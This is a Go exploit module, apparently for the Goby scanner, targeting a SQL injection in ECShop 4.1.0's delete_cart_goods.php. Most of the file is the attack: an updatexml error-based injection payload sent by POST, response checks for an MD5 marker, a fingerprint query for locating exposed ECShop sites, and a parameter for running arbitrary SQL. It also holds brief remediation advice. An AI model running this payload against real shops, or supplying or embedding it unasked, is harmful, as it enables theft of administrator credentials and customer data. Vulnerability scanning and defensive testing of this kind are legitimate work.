package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "ECShop delete_cart_goods.php SQLi",
    "Description": "ECSHOP is a professional e-commerce mall system. SQL injection vulnerability exists in ECSHOP 4.1.0, which can be used by attackers to obtain sensitive information.",
    "Impact": "ECShop delete_cart_goods.php SQLi",
    "Recommendation": "Update patch",
    "Product": "ECShop",
    "VulType": [
        "SQL Injection"
    ],
    "Tags": [
        "SQL Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "ECShop开源网店系统4.1.0版本前台SQL注入",
            "Description": "ECShop是一款专业的电商商城系统。ECShop商城系统4.1.0版本存在SQL注入漏洞，攻击者可利用漏洞获取敏感信息。",
            "Impact": "<p>ECShop是一款专业的电商商城系统。</p><p>ECShop商城系统4.1.0版本存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在数据库权限足够的情况下可以向服务器中写入一句话木马，从而获取 webshell 或进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户升级至最新版本：<a href=\"http://www.ecshop.com/\" target=\"_blank\">http://www.ecshop.com/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Product": "ECShop",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "ECShop delete_cart_goods.php SQLi",
            "Description": "ECSHOP is a professional e-commerce mall system. SQL injection vulnerability exists in ECSHOP 4.1.0, which can be used by attackers to obtain sensitive information.",
            "Impact": "ECShop delete_cart_goods.php SQLi",
            "Recommendation": "Update patch",
            "Product": "ECShop",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "FofaQuery": "(title=\"Powered by ECShop\" || header=\"ECS_ID\" || body=\"content=\\\"ECSHOP\" || body=\"id=\\\"ECS_CARTINFO\\\"\" || banner=\"ECS_ID\") || body=\"delete_cart_goods.php\"",
    "GobyQuery": "(title=\"Powered by ECShop\" || header=\"ECS_ID\" || body=\"content=\\\"ECSHOP\" || body=\"id=\\\"ECS_CARTINFO\\\"\" || banner=\"ECS_ID\") || body=\"delete_cart_goods.php\"",
    "Author": "sharecast.net@gmail.com",
    "Homepage": "http://www.ecshop.com/",
    "DisclosureDate": "2021-04-06",
    "References": [
        "https://mp.weixin.qq.com/s/1t0uglZNoZERMQpXVVjIPw"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "8.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/delete_cart_goods.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "id=0||(updatexml(1,concat(0x7e,(select%20md5(123)),0x7e),1))"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b7",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/delete_cart_goods.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "id=0||(updatexml(1,concat(0x7e,(select%20md5(123)),0x7e),1))"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b7",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "select database()",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "ECShop"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10174"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
